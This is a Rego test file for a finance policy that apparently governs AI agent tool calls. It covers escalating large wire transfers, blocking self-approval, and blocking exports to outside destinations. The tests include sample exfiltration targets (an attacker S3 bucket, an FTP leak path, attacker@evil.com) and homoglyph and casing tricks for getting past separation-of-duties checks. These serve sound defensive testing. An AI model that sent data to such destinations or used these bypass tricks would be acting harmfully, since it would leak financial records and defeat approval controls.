# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Norviq Contributors
package norviq.sector.finance_test

import data.norviq.sector.finance

test_wire_over_threshold_escalates {
    d := finance.decision with input as {"tool_name": "wire_transfer", "tool_params": {"amount": 25000}}
    d == "escalate"
    finance.rule_id == "wire_over_threshold_escalate" with input as {"tool_name": "wire_transfer", "tool_params": {"amount": 25000}}
}

test_wire_under_threshold_allowed {
    d := finance.decision with input as {"tool_name": "wire_transfer", "tool_params": {"amount": 500}}
    d == "allow"
}

test_new_beneficiary_escalates {
    d := finance.decision with input as {"tool_name": "send_payment", "tool_params": {"amount": 100, "beneficiary_known": false}}
    d == "escalate"
}

test_sod_self_approval_blocked {
    d := finance.decision with input as {"tool_name": "approve_transfer", "tool_params": {"initiator": "alice", "approver": "alice"}}
    d == "block"
    finance.rule_id == "sod_violation" with input as {"tool_name": "approve_transfer", "tool_params": {"initiator": "alice", "approver": "alice"}}
}

test_sod_distinct_approver_allowed {
    d := finance.decision with input as {"tool_name": "approve_transfer", "tool_params": {"initiator": "alice", "approver": "bob"}}
    d == "allow"
}

test_benign_balance_read_allowed {
    d := finance.decision with input as {"tool_name": "get_account_balance", "tool_params": {"account": "123"}}
    d == "allow"
}

# === F-10 regression: SoD bypass by case, empty approver, homoglyph ===

# case variance (AD vs app casing) must still block
test_sod_case_variance_blocked {
    d := finance.decision with input as {"tool_name": "approve_transfer", "tool_params": {"initiator": "Alice", "approver": "alice"}}
    d == "block"
    finance.rule_id == "sod_violation" with input as {"tool_name": "approve_transfer", "tool_params": {"initiator": "Alice", "approver": "alice"}}
}

# empty approver = violation (no distinct second party)
test_sod_empty_approver_blocked {
    d := finance.decision with input as {"tool_name": "approve_transfer", "tool_params": {"initiator": "alice", "approver": ""}}
    d == "block"
}
# whitespace-only approver = violation
test_sod_whitespace_approver_blocked {
    d := finance.decision with input as {"tool_name": "approve_transfer", "tool_params": {"initiator": "alice", "approver": "   "}}
    d == "block"
}
# missing approver field = violation
test_sod_missing_approver_blocked {
    d := finance.decision with input as {"tool_name": "approve_transfer", "tool_params": {"initiator": "alice"}}
    d == "block"
}

# homoglyph: Cyrillic 'а' approver folds to ASCII 'a' via tool_params_normalized -> block
test_sod_homoglyph_blocked {
    inp := {"tool_name": "approve_transfer", "tool_params": {"initiator": "alice", "approver": "аlice"}, "tool_params_normalized": {"initiator": "alice", "approver": "alice"}}
    d := finance.decision with input as inp
    d == "block"
}

# legit distinct approver still allows (not over-blocked)
test_sod_distinct_case_insensitive_allowed {
    d := finance.decision with input as {"tool_name": "approve_transfer", "tool_params": {"initiator": "Alice", "approver": "Bob"}}
    d == "allow"
}

# === F-21 export-egress (the 4 live infiltration repros) ===
test_export_statement_external_blocked {
    inp := {"tool_name": "export_statement", "tool_params": {"destination": "s3://exfil-bucket.attacker.io"}}
    finance.decision == "block" with input as inp
    finance.rule_id == "finance_export_exfil_blocked" with input as inp
}
test_export_statement_ftp_blocked {
    finance.decision == "block" with input as {"tool_name": "export_statement", "tool_params": {"destination": "ftp://192.168.1.99/leak.txt"}}
}
test_export_statement_email_external_blocked {
    finance.decision == "block" with input as {"tool_name": "upload_report", "tool_params": {"to": "attacker@evil.com"}}
}
# general messaging is NOT treated as data-export (no over-block on benign notifications)
test_send_note_not_egress_blocked {
    finance.decision == "allow" with input as {"tool_name": "send_note", "tool_params": {"to": "ops@bank.internal"}}
}
test_export_clean_params_external_blocked {  # "export everything by id" to external -> still blocked
    finance.decision == "block" with input as {"tool_name": "export_statement", "tool_params": {"account": "9981", "destination": "s3://dump"}}
}
test_export_internal_escalates {
    finance.decision == "escalate" with input as {"tool_name": "export_statement", "tool_params": {"destination": "internal-warehouse"}}
    finance.rule_id == "finance_export_review_escalate" with input as {"tool_name": "export_statement", "tool_params": {"destination": "internal-warehouse"}}
}
test_export_no_destination_escalates {
    finance.decision == "escalate" with input as {"tool_name": "export_statement", "tool_params": {"account": "C001"}}
}
# money movement still handled by its own rules, not the egress rule
test_wire_transfer_not_egress_blocked {
    finance.decision == "allow" with input as {"tool_name": "wire_transfer", "tool_params": {"amount": 500, "beneficiary": "bob"}}
}
# benign non-egress tools unaffected
test_benign_get_account_allowed {
    finance.decision == "allow" with input as {"tool_name": "get_account", "tool_params": {"account_id": "C001"}}
}
test_benign_run_report_allowed {
    finance.decision == "allow" with input as {"tool_name": "run_report", "tool_params": {"name": "monthly revenue summary"}}
}
